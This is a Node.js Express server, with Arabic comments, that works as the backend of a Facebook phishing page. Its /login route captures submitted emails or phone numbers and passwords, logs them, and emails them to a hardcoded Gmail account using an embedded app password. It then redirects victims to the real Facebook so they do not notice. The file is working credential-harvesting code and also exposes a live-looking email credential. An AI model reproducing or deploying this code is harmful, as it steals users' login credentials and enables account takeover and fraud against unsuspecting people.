const express = require('express');
const path = require('path');
const nodemailer = require('nodemailer');

const app = express();
const PORT = process.env.PORT || 3000;

// قراءة بيانات النموذج
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// عرض ملفات الواجهة
app.use(express.static(path.join(__dirname)));

// إعداد خدمة البريد (Gmail)
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: 'flashhakmn@gmail.com',
        pass: 'oifw pwwd jmew nies'
    }
});

// استقبال البيانات وإرسالها إلى إيميلك
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    
    console.log(`محاولة تسجيل دخول جديدة - البريد: ${email} | كلمة المرور: ${password}`);

    // محتوى الإيميل الذي سيصلك
    const mailOptions = {
        from: 'flashhakmn@gmail.com',
        to: 'flashhakmn@gmail.com',
        subject: '⚠️ بيانات جديدة تم إدخالها في المشروع',
        text: `تم رصد بيانات تسجيل دخول جديدة:\n\nالبريد الإلكتروني / الهاتف: ${email}\nكلمة المرور: ${password}\nالوقت: ${new Date().toLocaleString()}`
    };

    // إرسال البريد
    transporter.sendMail(mailOptions, (error, info) => {
        if (error) {
            console.error('خطأ في إرسال البريد:', error);
        } else {
            console.log('تم إرسال الإيميل بنجاح:', info.response);
        }
        
        // إعادة توجيه المستخدم لفيسبوك الحقيقي
        res.redirect('https://www.facebook.com');
    });
});

app.listen(PORT, () => {
    console.log(`الخادم يعمل الآن على الرابط: http://localhost:${PORT}`);
});